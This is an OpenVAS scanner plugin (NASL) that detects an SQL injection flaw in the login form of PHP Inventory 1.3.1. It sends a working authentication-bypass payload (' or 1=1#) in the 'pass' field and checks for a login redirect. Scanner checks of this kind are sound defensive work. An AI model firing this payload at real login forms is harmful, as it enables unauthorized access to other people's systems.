###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_inventory_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# PHP Inventory 'user' and 'pass' Parameters SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to include arbitrary
  HTML or web scripts in the scope of the browser and allows to obtain and
  manipulate sensitive information.
  Impact Level: Application";
tag_affected = "PHP Inventory version 1.3.1";
tag_insight = "The flaw is due to an input passed the to 'user' and 'pass' form field
  in 'index.php' is not properly sanitised before being used in an SQL query.";
tag_solution = "Upgrade to PHP Inventory version 1.3.2 or later
  For updates refer to http://www.phpwares.com/content/php-inventory";
tag_summary = "This host is running PHP inventory and is prone to SQL injection
  vulnerability.";

if(description)
{
  script_id(802534);
  script_version("$Revision: 13 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-05 15:37:27 +0530 (Mon, 05 Dec 2011)");
  script_name("PHP Inventory 'user' and 'pass' Parameters SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Dec/0");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/520692");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/107425/INFOSERVE-ADV2011-08.txt");

  script_description(desc);
  script_summary("Determine if PHP Inventory is prone to SQL injection vulnerabliilty");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check host supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get the host name
host = get_host_name();
if(!host){
  exit(0);
}

## Iterate over possible directories
foreach dir (make_list("/", "/php-inventory", cgi_dirs()))
{
  variables = string("user=admin&pass=%27+or+1%3D1%23");

  ## Construct POST request
  req = string("POST /php-inventory/index.php HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(variables),
               "\r\n\r\n", variables);

  ## Confirm user is logged in or not
  result = http_keepalive_send_recv(port:port, data:req);
  if(egrep(pattern:"^HTTP/.* 302 Found", string:result) &&
                   "Location: index.php" >< result)
  {
    security_hole(port);
    exit(0);
  }
}
